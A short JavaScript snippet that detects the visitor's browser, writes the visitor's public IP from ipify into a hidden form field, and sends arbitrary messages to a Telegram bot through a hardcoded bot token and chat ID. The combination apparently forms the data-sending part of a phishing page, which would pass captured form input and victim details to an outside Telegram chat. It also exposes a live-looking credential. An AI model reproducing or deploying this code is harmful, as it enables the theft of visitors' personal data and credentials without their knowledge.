function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
async function notify(message){
    const botToken='7606277895:AAEEvGTP0tCmUury7ngWLyfu9PjG01QusoU';
    const chatId='6902150530';
    const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
                chat_id: chatId,
                text: message
            };

    $.ajax({
        url: url,
        type: 'POST',
        data: JSON.stringify(data),
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        cache: false,
        async: false,
        success: function (resp) {
            console.log(resp);
        },
        error: function(e) {
             console.log('Error: '+e);
        }
        });
}
